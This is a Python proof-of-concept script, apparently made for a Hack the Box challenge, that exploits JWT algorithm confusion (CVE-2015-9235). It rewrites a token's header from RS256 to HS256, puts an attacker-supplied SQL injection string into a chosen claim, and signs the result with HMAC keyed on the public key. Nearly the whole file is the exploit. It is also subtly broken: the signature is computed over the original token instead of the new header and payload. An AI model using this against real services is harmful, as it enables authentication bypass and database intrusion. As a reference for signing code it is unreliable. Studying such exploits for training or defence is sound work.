#JWT Key Confusion (CVE 2015-9235)
#https://github.com/aalex954

import base64
import argparse
import json
from codecs import encode, decode
import hashlib
import hmac
from colorama import Fore

#Take user input
parser = argparse.ArgumentParser(description="JWT Confusion CVE-2015-9235 PoC for the Hack the Box challenge - Under Construction")
parser.add_argument("token_loc", type=str, help="location of JWT token (must include 'pk' payload)")
parser.add_argument("replace_claim", type=str, help="payload claim to target")
parser.add_argument("sqli_cmd", type=str, help="new claim value")
args = parser.parse_args()

#Load token
print(Fore.YELLOW + "TOKEN DIR:" + args.token_loc + Fore.RESET)
token_file = open(args.token_loc, "r")
token = token_file.read()
token_file.close
print()

#Split token into parts (header, payload, signature)
token_parts = []

for parts in token.split("."):
    token_parts.append(parts)

token_header = token_parts[0]
token_payload = token_parts[1]
token_signature = token_parts[2]

decoded_header = base64.urlsafe_b64decode(token_header).decode('UTF-8')

#Pull public key from payload (HTB Under Construction)
decoded_payload = base64.urlsafe_b64decode(token_payload).decode('UTF-8')
decoded_payload_json = json.loads(decoded_payload)
public_key = decoded_payload_json.get('pk')

#Print Original Decoded JWT
print(Fore.YELLOW + "ORIGINAL TOKEN:" + Fore.RESET)
print(token)
print(Fore.YELLOW + "SIGNATURE:" + Fore.RESET)
print(token_signature)
print(Fore.YELLOW + "HEADER: "  + Fore.RESET)
print(decoded_header)
print(Fore.YELLOW + "PAYLOAD: "  + Fore.RESET)
print(json.dumps(decoded_payload_json))
print(Fore.YELLOW + "PUBLIC KEY: "  + Fore.RESET)
print(public_key)

print("---------------------------------------------------------------\n")

#Create new header (change from RS256 -> HS256)
header = '{"alg":"HS256","typ":"JWT"}'
print(Fore.YELLOW + "NEW HEADER: " + Fore.RESET)
print(header + "\n")
print(Fore.GREEN + "ENCODED: " + Fore.RESET)
headerEncodedBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
print(headerEncodedBytes)
print()

#print(headerEncodedBytes)
encodedHeader = str(headerEncodedBytes, "utf-8").rstrip("=")

#Create new payload with claim replaced (key and value)
claim = args.replace_claim
decoded_payload_json[claim] = args.sqli_cmd

payload = json.dumps(decoded_payload_json)
print(Fore.YELLOW + "NEW PAYLOAD: " + Fore.RESET)
print(payload)
payloadEncodedBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
print(Fore.GREEN + "ENCODED: " + Fore.RESET)
print(payloadEncodedBytes)
print()
encodedPayload = str(payloadEncodedBytes, "utf-8").rstrip("=")

#Create new token
newToken = (encodedHeader + "." + encodedPayload)

print()

sig = base64.urlsafe_b64encode(
    hmac.new(public_key.encode(),token.encode(),
    hashlib.sha256).digest()).decode('UTF-8').strip("=")

print(Fore.YELLOW + "NEW SINGATURE: " + Fore.RESET)
print(sig + "\n")

#Print new token
token = newToken + "." + sig
print(Fore.YELLOW + "NEW TOKEN: " + Fore.RESET)
print(token)
